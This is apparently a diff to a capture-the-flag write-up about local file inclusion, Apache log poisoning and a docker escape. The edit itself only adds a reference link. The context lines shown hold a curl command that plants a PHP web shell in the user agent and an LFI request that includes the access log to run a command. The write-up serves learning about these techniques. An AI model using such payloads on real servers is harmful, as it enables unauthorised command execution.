@@ -93,6 +93,7 @@ curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
 # Step 2: Include access log
 page=../../../var/log/apache2/access.log&cmd=whoami
 ```
+[Hackviser article](https://hackviser.com/tactics/pentesting/web/lfi-rfi)
 
 So I searched for the apache log file as the nmap scan revealed this was an apache server.
 
@@ -164,7 +165,7 @@ And finally got a callback on the host machine outside the docker container, and
 
 ## Thoughts
 I thought this box was very interesting. I have had almost zero practice with LFI so Im glad I got to use this box to really drill in the concept and learn about novel attack paths with LFI such as log poisoning. I also really enjoyed how unique this box was as well in the sense that we were in a docker container and had to break out of it to the host machine using the backup.sh script and deciphering that since /root/container cant be accesse through the docker container, it must be a crontab (hopefully) on the host machine. Really fun box.
---
+---
 
 Thank you for reading!
 
